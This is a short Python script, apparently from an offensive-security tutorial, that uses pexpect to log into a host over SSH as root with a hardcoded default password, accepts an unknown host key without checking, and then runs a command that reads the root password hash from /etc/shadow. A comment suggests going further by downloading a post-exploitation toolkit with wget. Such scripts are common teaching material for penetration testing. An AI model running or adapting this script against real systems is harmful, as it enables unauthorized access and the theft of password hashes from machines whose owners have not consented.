import pexpect

PROMPT = ['# ', '>>> ', '>', '\$ ']

def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)

def connect(user, host, password):
    ssh_new_key = 'Are you sure you want to continue connecting'
    conn_str = 'ssh ' + user + '@' + host
    child = pexpect.spawn(conn_str)
    ret = child.expect([pexpect.TIMEOUT, ssh_new_key, '[P|p]assword:'])
    if ret == 0:
        print('Error Connecting!')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
    if ret == 0:
        print('Error Connecting!')
        return
    child.sendline(password)
    child.expect(PROMPT)
    return child

def main():
    host = 'localhost'
    user = 'root'
    password = 'toor'
    child = connect(user, host, password)
    # Displays the hashed password for the root user. We could could do something more devious here
    # like using wget to download a post exploitation toolkit.
    send_command(child, 'cat /etc/shadow | grep root')

if __name__ == '__main__':
    main()